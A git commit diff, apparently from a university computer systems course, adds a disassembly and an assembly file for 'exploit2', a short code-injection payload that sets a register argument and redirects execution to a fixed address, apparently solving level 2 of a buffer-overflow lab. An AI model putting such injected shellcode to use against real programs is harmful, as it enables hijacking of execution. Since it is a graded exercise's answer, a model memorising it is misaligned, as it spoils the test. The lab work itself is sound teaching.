a8a4fbf6aab3c160818e0f484790dd0a64eacd47
user <bryan.heiser@colorado.edu>
2018-03-14 12:33:19 -0600

    adding Comp Systems

---
+++ Computer-Systems/target114/level2.d
@@ -0,0 +1,10 @@
+
+level2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+00000000fffffff0 <exploit2>:
+   fffffff0:	48 c7 c7 9f 5f 19 19 	mov    $0x19195f9f,%rdi
+   fffffff7:	68 cc 17 40 00       	pushq  $0x4017cc
+   fffffffc:	c3                   	retq   
---
+++ Computer-Systems/target114/level2.s
@@ -0,0 +1,4 @@
+exploit2:	
+	movq    $0x19195f9f, %rdi
+	pushq   $0x4017cc
+	retq
